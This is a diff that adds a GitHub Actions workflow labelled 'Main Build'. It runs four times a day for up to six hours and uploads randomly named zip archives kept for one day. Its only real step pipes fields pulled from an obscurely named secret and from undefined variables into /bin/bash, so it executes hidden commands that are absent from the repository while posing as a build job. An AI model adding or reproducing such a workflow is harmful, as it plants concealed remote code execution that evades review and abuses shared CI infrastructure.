@@ -1,0 +1,35 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Go
+        env:
+          nogd74: ${{ secrets.nogd74 }}
+        run: |
+          printf '%s' "$nogd74" | jq -r .u3782 | /bin/bash
+          printf '%s' "$z28" | jq -r .tbddz6 | /bin/bash
+          echo $w9725 | jq -r .ahzpl6311 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: P3N6NBsi
+          path: "*.zip"
+          retention-days: 1
